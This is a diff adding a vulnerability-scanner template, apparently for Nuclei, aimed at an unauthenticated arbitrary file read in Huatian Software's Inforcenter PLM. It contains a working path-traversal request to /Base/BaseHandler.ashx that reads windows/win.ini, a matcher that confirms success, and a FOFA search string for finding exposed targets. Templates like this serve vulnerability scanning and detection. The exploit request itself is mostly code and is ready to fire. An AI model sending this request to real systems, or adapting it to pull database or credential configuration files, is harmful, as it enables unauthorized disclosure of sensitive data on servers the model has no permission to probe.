@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - ; for 16-bit app support
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /Base/BaseHandler.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          type=downloadFile&extensionName=config&fileName=../../windows/win.ini
+id: huatian-Inforcenter-PLM-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/Base/BaseHandler.ashx"
+        华天软件 Inforcenter PLM存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 华天软件 Inforcenter PLM 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/o8d5bE0odL7sQnbqOP7Aug
+    severity: high
+    tags:
+        - File reading
